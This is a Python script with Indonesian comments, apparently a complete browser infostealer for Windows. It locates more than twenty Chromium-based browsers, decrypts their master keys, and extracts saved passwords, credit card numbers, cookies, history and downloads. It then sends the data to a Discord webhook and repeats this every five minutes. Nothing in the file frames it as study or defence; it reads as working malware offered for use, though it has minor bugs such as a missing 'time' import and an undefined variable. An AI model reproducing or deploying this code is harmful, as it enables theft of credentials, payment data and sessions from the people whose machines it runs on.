import json
import os
import shutil
import sqlite3
import base64
import requests  # Pastikan pustaka requests terinstal
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"  # Ganti dengan URL webhook Discord Anda

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16]  # Hapus tag autentikasi di bagian akhir
    try:
        # Menambahkan error='ignore' untuk mengabaikan karakter yang tidak dapat didekode
        decrypted_pass = decrypted_pass.decode(errors='ignore')
    except UnicodeDecodeError:
        decrypted_pass = "<UNDECODABLE>"
    return decrypted_pass


def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


def send_to_discord(browser_name, type_of_data, content):
    if content and content.strip():
        payload = {
            "username": "Data Extractor",
            "embeds": [
                {
                    "title": f"{browser_name} - {type_of_data.replace('_', ' ').capitalize()}",
                    "description": f"```{content[:1900]}```"  # Batas karakter Discord
                }
            ]
        }
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print(f"[*] Data berhasil dikirim ke Discord: {browser_name} - {type_of_data}")
        else:
            print(f"[-] Gagal mengirim ke Discord: {response.status_code}, {response.text}")


def save_results(browser_name, type_of_data, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
    if content and content.strip():
        file_path = f'{browser_name}/{type_of_data}.txt'
        with open(file_path, 'w', encoding="utf-8") as f:
            f.write(content)
        print(f"\t [*] Disimpan di {file_path}")
        send_to_discord(browser_name, type_of_data, content)
    else:
        print(f"\t [-] Tidak ada data ditemukan untuk {browser_name} - {type_of_data}")


def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
    except:
        print(f"Can't access file {type_of_data['file']}")
        return result
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes) and row[i]:
                    row[i] = decrypt_password(row[i], key)
        if data_type_name == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result


def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x] + "\\Local State"):
            available.append(x)
    return available

def run_in_background():
    while True:  # Loop forever to keep the script running
        available_browsers = installed_browsers()

        for browser in available_browsers:
            browser_path = browsers[browser]
            master_key = get_master_key(browser_path)
            print(f"Getting Stored Details from {browser}")

            for data_type_name, data_type in data_queries.items():
                print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
                notdefault = ['opera-gx']
                profile = "Default"
                if browser in notdefault:
                    profile = ""
                data = get_data(browser_path, profile, master_key, data_type)
                save_results(browser, data_type_name, data)
                print("\t------\n")

        time.sleep(60 * 5)  # Wait for 5 minutes before re-running the process

if __name__ == '__main__':
    available_browsers = installed_browsers()
    run_in_background()  # Start the background process

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f"Getting Stored Details from {browser}")

        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            notdefault = ['opera-gx']  # Browser yang tidak menggunakan profil "Default"
            profile = "Default"
            if browser in notdefault:
                profile = ""
            data = get_data(browser_path, profile, master_key, data_type)
            save_results(browser, data_type_name, data)
            print("\t------\n")
